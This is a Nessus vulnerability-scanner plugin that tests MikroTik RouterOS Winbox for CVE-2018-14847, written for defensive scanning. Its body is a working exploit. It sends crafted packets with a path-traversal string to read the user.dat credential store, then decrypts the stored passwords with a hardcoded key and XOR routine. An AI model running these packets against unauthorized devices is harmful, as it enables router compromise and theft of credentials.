#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(117335);
  script_version("1.8");
  script_set_attribute(attribute:"plugin_modification_date", value:"2023/04/25");

  script_cve_id("CVE-2018-14847");
  script_xref(name:"CISA-KNOWN-EXPLOITED", value:"2022/06/01");

  script_name(english:"MikroTik RouterOS Winbox Unauthenticated Arbitrary File Read/Write Vulnerability");

  script_set_attribute(attribute:"synopsis", value:
"The remote networking device is affected by an unauthenticated
arbitrary file read/write vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote networking device is running a version of MikroTik
RouterOS vulnerable to an unauthenticated arbitrary file read and
write vulnerability. An unauthenticated attacker could leverage this
vulnerability to read or write protected files on the affected host.
Nessus was able to exploit this vulnerability to retrieve the device
credential store.");
  script_set_attribute(attribute:"see_also", value:"https://github.com/BasuCert/WinboxPoC");
  script_set_attribute(attribute:"see_also", value:"https://n0p.me/winbox-bug-dissection/");
  script_set_attribute(attribute:"see_also", value:"https://blog.mikrotik.com/security/winbox-vulnerability.html");
  # https://github.com/tenable/routeros/blob/master/bug_hunting_in_routeros_derbycon_2018.pdf
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?25ba70ca");
  script_set_attribute(attribute:"solution", value:
"Upgrade to MikroTik RouterOS 6.40.8 / 6.42.1 / 6.43rc4 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:H/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2018-14847");
  script_set_attribute(attribute:"cvss_score_rationale", value:"Vulnerability allows reads and writes to the file system");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2018/04/23");
  script_set_attribute(attribute:"patch_publication_date", value:"2018/04/23");
  script_set_attribute(attribute:"plugin_publication_date", value:"2018/09/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:mikrotik:routeros");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2018-2023 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("mikrotik_winbox_detect.nasl");
  script_require_ports("Services/mikrotik_winbox");

  exit(0);
}
include("global_settings.inc");
include("misc_func.inc");
include("audit.inc");
include("data_protection.inc");

function pw_dec(user, pass)
{
  local_var key, i, dec_pass = '';
  key = MD5(user + '283i4jfkai3389');
  for (i = 0; i < strlen(pass); i++)
  {
    dec_pass += raw_string(ord(pass[i]) ^ ord(key[i % strlen(key)]));
  }
  if (stridx(dec_pass, '\0') <= 0)
    return dec_pass;
  else
    return substr(dec_pass, 0, stridx(dec_pass, '\0') - 1);
}

pkt_a = 'h\x01\x00fM2\x05\x00\xff\x01\x06\x00\xff\t\x05\x07\x00\xff\t\x07\x01\x00\x00!5/////./..//////./..//////./../flash/rw/store/user.dat\x02\x00\xff\x88\x02\x00\x00\x00\x00\x00\x08\x00\x00\x00\x01\x00\xff\x88\x02\x00\x02\x00\x00\x00\x02\x00\x00\x00';

pkt_b = ';\x01\x009M2\x05\x00\xff\x01\x06\x00\xff\t\x06\x01\x00\xfe\t5\x02\x00\x00\x08\x00\x80\x00\x00\x07\x00\xff\t\x04\x02\x00\xff\x88\x02\x00\x00\x00\x00\x00\x08\x00\x00\x00\x01\x00\xff\x88\x02\x00\x02\x00\x00\x00\x02\x00\x00\x00';

port = get_service(svc:"mikrotik_winbox", exit_on_fail:TRUE);
userlist = {};

soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port);

send(socket:soc, data:pkt_a);
res = recv(socket:soc, length:1024);
if (!res || strlen(res) < 39)
{
  close(soc);
  audit(AUDIT_RESP_NOT, port);
}
pkt_b[19] = res[38];

send(socket:soc, data:pkt_b);
res = recv(socket:soc, length:1024);
close(soc);
if (!res || stridx(res, '\x01\x00\x00\x21') == -1)
  audit(AUDIT_LISTEN_NOT_VULN,'MikroTik RouterOS' , port);

foreach entry (split(substr(res, 55), sep:"M2", keep:FALSE))
{
  if (strlen(entry) == 0) continue;
  str = strstr(entry, '\x01\x00\x00\x21');
  pwstr = strstr(entry, '\x11\x00\x00\x21');
  if (str && pwstr)
  {
    userlist[substr(str, 5, 4 + ord(str[4]))] = substr(pwstr, 5, 4 + ord(pwstr[4]));
  }
}

if (userlist)
{
  report = '';
  report += '\nNessus was able to enumerate the following username and password pairs\nfrom the user.dat file:';
  foreach username (keys(userlist))
  {
    report += '\n  Username: ' + data_protection::sanitize_userpass(text:username);
    report += '\n  Password: ' + data_protection::sanitize_userpass(text:pw_dec(user:username, pass:userlist[username])) + '\n';
  }

  security_report_v4(port:port, extra:report, severity:SECURITY_WARNING);
}
else
  audit(AUDIT_LISTEN_NOT_VULN,'MikroTik RouterOS' , port);

